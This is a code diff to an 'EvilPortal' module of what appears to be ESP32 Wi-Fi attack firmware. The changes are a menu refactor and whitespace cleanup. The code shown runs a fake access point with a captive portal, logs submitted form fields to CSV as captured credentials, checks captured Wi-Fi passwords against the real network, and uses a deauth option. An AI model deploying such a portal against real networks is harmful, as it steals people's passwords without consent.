@@ -3,6 +3,7 @@
 #include "core/sd_functions.h"
 #include "core/mykeyboard.h"
 #include "core/wifi_common.h"
+#include "core/utils.h"
 #include "wifi_atks.h"
 #include "esp_wifi.h"
 
@@ -26,9 +27,9 @@ EvilPortal::~EvilPortal() {
 bool EvilPortal::setup() {
     bool returnToMain = false;
     options = {
-        {"Custom Html", [=]() { loadCustomHtml(); }},
-        {"Main Menu",   [&]() { returnToMain = true; }}
+        {"Custom Html", [=]() { loadCustomHtml(); }}
     };
+    addOptionToMainMenu();
 
     if (!_verifyPwd) {
         // Insert Options
@@ -36,7 +37,7 @@ bool EvilPortal::setup() {
     } else {
         options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml_one(); }});
     }
-        
+
     loopOptions(options);
 
     if (returnToMain) return false;
@@ -131,14 +132,14 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     if (WiFi.status() == WL_CONNECTED) {
         isConnected = true;
         delay(200);
-        
+
     }
     // re enable
     if (_deauth) {
         temp_stop = false;
     }
 
-    // revert to AP mode 
+    // revert to AP mode
     WiFi.mode(WIFI_MODE_AP);
     return isConnected;
 
@@ -166,14 +167,14 @@ void EvilPortal::restartWiFi(bool reset) {
     webServer.stop();
     wifiDisconnect();
     WiFi.softAP(apName);
-    webServer.begin();  
+    webServer.begin();
 
     // code to handle whether to reset the counter..
 
     if (reset) {
         resetCapturedCredentials();
 
-    } 
+    }
 }
 
 void EvilPortal::resetCapturedCredentials(void) {
@@ -239,7 +240,7 @@ void EvilPortal::drawScreen(bool holdDeauth) {
     } else {
         padprint("Attempt: ");
     }
-    
+
     tft.setTextColor(TFT_RED);
     tft.println(String(totalCapturedCredentials));
     tft.setTextColor(bruceConfig.priColor);
@@ -338,7 +339,7 @@ void EvilPortal::credsController() {
 
     for (int i = 0; i < webServer.args(); i++) {
         key = webServer.argName(i);
-        
+
         if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" || key == "P3" || key == "P4") {
             continue;
         }
@@ -354,12 +355,12 @@ void EvilPortal::credsController() {
         if (i > 0) {
             csvLine += ",";
         }
- 
+
         // Skip irrelevant parameters
 
         csvLine += key + ": " + webServer.arg(i);
         lastCred += key.substring(0, 3) + ": " + webServer.arg(i) + "\n";
-        
+
     }
 
 
@@ -394,8 +395,8 @@ void EvilPortal::credsController() {
 
     } else {
         saveToCSV(csvLine);
-        webServer.send(200, "text/html", wifiLoadPage());    
-        
+        webServer.send(200, "text/html", wifiLoadPage());
+
     }
 
 
